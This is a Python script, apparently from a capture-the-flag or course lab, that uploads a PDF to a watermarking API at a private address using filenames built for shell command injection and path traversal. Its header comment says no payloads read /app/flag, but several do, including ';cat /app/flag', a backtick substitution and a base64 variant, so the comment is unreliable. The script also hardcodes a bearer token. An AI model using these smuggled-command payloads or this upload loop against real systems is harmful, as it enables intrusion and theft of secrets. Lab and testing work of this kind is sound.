#!/usr/bin/env python3
# upload_probe_pdf.py
# Provar att ladda upp en riktig PDF (test.pdf) med olika filename-payloads.
# OBS: inga payloads som läser /app/flag inkluderas här — endast harmlösa echo-/test-payloads.

import requests, json, time, os, sys

TARGET = "http://10.11.12.10:5000"
TOKEN = os.environ.get("TOKEN", ".eJyrVirNTFGyMtNRyslPz8xTslLKTXVIrUjMLchJ1UvOz1XSUUrNTczMwZSoBQBAUhPC.aOPUIw.jiELOf-hToTTQl7w8ztoz0gRE4A")
if TOKEN is None or TOKEN == ".eJyrVirNTFGyMtNRyslPz8xTslLKTXVIrUjMLchJ1UvOz1XSUUrNTczMwZSoBQBAUhPC.aOPUIw.jiELOf-hToTTQl7w8ztoz0gRE4A":
    print("Sätt miljövariabeln TOKEN, t.ex. export TOKEN=$(cat ~/.config/tatou/token08.txt)")
    # Fortsätt ändå om du vill, men anropa kommer misslyckas utan token.
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# Använd en verklig PDF som finns i katalogen
LOCAL_PDF = "test.pdf"
if not os.path.exists(LOCAL_PDF):
    print(f"Filen {LOCAL_PDF} hittades inte. Lägg en riktig PDF med det namnet i samma katalog.")
    sys.exit(1)

# Lista med säkra test-payloads (ingen /app/flag). Dessa bekräftar om filename tolkas av skalet.
payloads = [
    "exploit.pdf",
    "exploit;echo HAX;#",
    "exploit;echo START;echo HAX;echo END;#",
    "exploit`echo HAX`.pdf",
    "exploit$(echo HAX).pdf",
    "exploit;echo START;printf 'SLASH_TEST_%s' $(printf '\\057') ;echo END;#",  # visar hur man bygger slashtecken utan att faktiskt använda dem
    "../../etc_passwd_attempt",
    "../traversal_attempt",
    '"; (cat /app/flag) || echo "error"; echo "',
    '"; cat /app/flag | base64; echo "',
    "exploit.pdf",
    "exploit;echo HAX;#",
    "exploit;echo START;echo HAX;echo END;#",    # double-check echo execution  
    "exploit;echo START;cat /app/flag;echo END;#",
    "exploit;cat /app/flag;#",
    "exploit`echo HAX`.pdf",
    "exploit$(echo HAX).pdf",
    "../../app/flag",
    "../app/flag",
    "`cat /app/flag`.pdf" 
]

results = []

def try_upload(payload_filename, localfile=LOCAL_PDF):
    # skickar multipart med explicit filename
    with open(localfile, "rb") as fh:
        files = {"file": (payload_filename, fh, "application/pdf")}
        try:
            r = requests.post(f"{TARGET}/api/upload-document", headers=HEADERS, files=files, timeout=20)
            return r.status_code, r.text
        except Exception as e:
            return None, str(e)

for p in payloads:
    print("Trying:", p)
    status, body = try_upload(p)
    print(" ->", status)
    entry = {"payload": p, "status": status, "body_head": (body[:2000] if isinstance(body, str) else str(body))}
    results.append(entry)

    # Om upload returnerar JSON med id så kan vi automatiskt försöka create/read med *harmlös* method
    # Vi använder en "echo"-style testmetod (t.ex. invisible_text eller annan icke-destructive method)
    if status in (200,201) and body:
        try:
            j = json.loads(body)
            did = j.get("id") or j.get("document_id") or j.get("did")
            entry["json"] = j
            entry["doc_id"] = did
            if did:
                # Försök skapa vattenmärke med ofarlig metod/ny secret — anpassa fältnamn efter ert API
                try:
                    rc = requests.post(
                        f"{TARGET}/api/create-watermark",
                        headers={**HEADERS, "Content-Type":"application/json"},
                        json={"method":"invisible_text","document_id":did,"key":"dummy","secret":"test-echo"},
                        timeout=20
                    )
                    entry["create_status"] = rc.status_code
                    entry["create_body"] = rc.text[:2000]
                except Exception as e:
                    entry["create_error"] = str(e)

                # Försök läsa watermark (ofarligt)
                try:
                    rr = requests.post(
                        f"{TARGET}/api/read-watermark/{did}",
                        headers={**HEADERS,"Content-Type":"application/json"},
                        json={"method":"invisible_text","key":"dummy"},
                        timeout=20
                    )
                    entry["read_status"] = rr.status_code
                    entry["read_body"] = rr.text[:5000]
                except Exception as e:
                    entry["read_error"] = str(e)
        except Exception:
            pass

    # kort paus så vi inte spammar servern
    time.sleep(0.4)

with open("results_pdf.json","w") as fh:
    json.dump(results, fh, indent=2, ensure_ascii=False)

print("Done. Se results_pdf.json")
